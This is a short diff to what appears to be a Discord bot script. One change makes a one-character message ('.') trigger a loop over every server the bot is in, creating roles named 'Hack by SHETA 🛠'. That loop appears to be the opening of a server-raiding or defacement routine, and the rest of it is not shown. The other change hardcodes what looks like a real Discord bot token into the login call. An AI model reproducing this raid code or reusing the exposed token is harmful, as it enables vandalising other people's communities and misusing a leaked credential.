@@ -72,7 +72,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "") {
+  if (message.content === ".") {
     LOka.guilds.forEach(m => {
       m.createRole({
         name: "Hack by SHETA 🛠",
@@ -1058,4 +1058,5 @@ LOka.on("guildMemberAdd", member => {
   }
 });
 
-LOka.login("");
+
+LOka.login("Nzc4OTQzMTExNDY4NDE3MDY0.X7ZVTQ.WnuhzyLfsTX-V2fjFPLIIyAiHn8");
